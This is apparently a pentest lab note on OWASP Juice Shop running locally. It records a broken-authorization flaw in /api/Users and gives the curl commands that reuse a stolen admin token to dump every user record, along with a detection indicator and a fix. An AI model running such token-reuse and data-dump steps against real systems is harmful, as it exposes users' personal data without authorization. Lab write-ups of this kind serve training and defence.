---
title: "Juice Shop · 05 · BOLA — full user directory dump"
tags: [juiceshop, bola, broken-access-control, exfil]
verdict: confirmed
cwe: [CWE-639, CWE-284]
---

# 05 · BOLA user dump — 🟢 F3 confirmed

`/api/Users` correctly rejects anonymous requests but does **not** enforce per-object authorization — any authenticated token (here the admin JWT from [[juiceshop-04-sqli-auth-bypass]]) reads the whole user table.

## Commands

```bash
TOK=$(grep -o '"token":"[^"]*"' sqli.json | head -1 | cut -d'"' -f4)

curl -s http://localhost:3000/api/Users -w "HTTP %{http_code}\n"                     # 401 (no token)
curl -s http://localhost:3000/api/Users -H "Authorization: Bearer $TOK" \
  -o users_auth.json -w "HTTP %{http_code}\n"                                        # 200 (with token)
```

## Result

- Anonymous → **401** "No Authorization header" (good).
- With stolen admin token → **200**, **22 user records** returned.
- Exposed fields per user: `id, username, email, role, deluxeToken, lastLoginIp, profileImage, isActive, createdAt, updatedAt, deletedAt`.
- Password/hash field **is stripped in v20** — credit where due; but emails, roles, `lastLoginIp`, and `deluxeToken` are excessive for a list endpoint.

```
first record: {"id":1,"email":"admin@juice-sh.op","role":"admin","deluxeToken":"","lastLoginIp":"", ...}
```

## Next

- Map the chain to MITRE → [[juiceshop-06-mitre-killchain]].
- IOC for the SOC: a freshly-issued token immediately performing a full-table `/api/Users` read.
- Fix: enforce object-level authz; strip `deluxeToken`/`lastLoginIp` from list responses.
